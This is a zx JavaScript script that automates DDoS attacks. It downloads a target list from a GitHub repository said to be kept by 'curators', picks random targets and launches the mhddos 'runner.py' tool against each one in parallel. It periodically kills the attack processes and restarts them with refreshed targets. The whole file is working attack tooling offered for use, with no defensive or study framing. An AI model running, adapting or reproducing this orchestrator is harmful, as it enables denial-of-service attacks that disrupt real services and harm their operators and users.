#!/usr/bin/env zx

// $.verbose = false;

// ===== CONSTANTS

const second = 1;
const minute = second * 60;

// ===== ARGUMENTS

const {
  _, // we don't need positional arguments
  c, // we don't need custom targets
  config, // we don't need custom targets
  /** minimum – 1, maximum – number of targets */
  parallel = 1,
  'restart-interval': restartInterval = minute * 10,
  debug = true,
  ...mhddosArgs
} = argv;

const mhddosFlags = parseFlags(mhddosArgs);

// ===== RUN

await startAttack();

const intervalId = setInterval(async () => {
  await quiet(nothrow($`pkill -f runner.py`));
  console.log(`\nStopped attacks, updating targets.\n\n${'-'.repeat(50)}\n`);

  await startAttack();
}, Math.max(minute * 5, restartInterval) * 1000);

process.on('SIGINT', function () {
  clearInterval(intervalId);
  process.exit();
});

// ===== UTILS

async function startAttack() {
  const targets = await getRandomTargets(parallel);
  const flags = [debug ? '--debug' : undefined, ...mhddosFlags];
  // console.log({ targets });
  // console.log({ flags });

  if (targets.length) {
    console.log('\nStarting attacks...');
    targets.forEach(async (target) => {
      nothrow($`python3 runner.py ${target.split(' ')} ${flags.filter(Boolean)}`);
    });
  } else {
    console.log(`There are currently no active targets. Waiting for updates from curators...`);
  }
}

async function getRandomTargets(parallel) {
  const targets = await getTargetList();
  const targetLength =
    parallel === 'all'
      ? targets.length
      : typeof parallel === 'number'
      ? Math.max(1, Math.min(parallel, targets.length))
      : 1;
  // console.log({ targets });
  // console.log({ targetLength });
  const randomTargets = [];

  while (randomTargets.length < targetLength) {
    const randomTarget = targets[Math.floor(Math.random() * targets.length)];

    if (!randomTargets.includes(randomTarget)) {
      randomTargets.push(randomTarget);
    }
  }

  return randomTargets;
}

async function getTargetList() {
  console.log('Getting targets...');
  const response = await fetch('https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets');

  if (!response.ok) {
    console.log('Failed to get targets.');
    return [];
  }

  const fileContent = await (response.ok ? response.text() : Promise.resolve(''));
  const targets = fileContent.match(/^(?:[^#].)+?$/gm)?.map((target) => target.replace('runner.py ', '')) || [];

  return [...new Set(targets)];
}

function parseFlags(args) {
  return Object.entries(args).map(([key, value]) => {
    return `${key.length === 1 ? '-' : '--'}${key}=${value}`;
  });
}
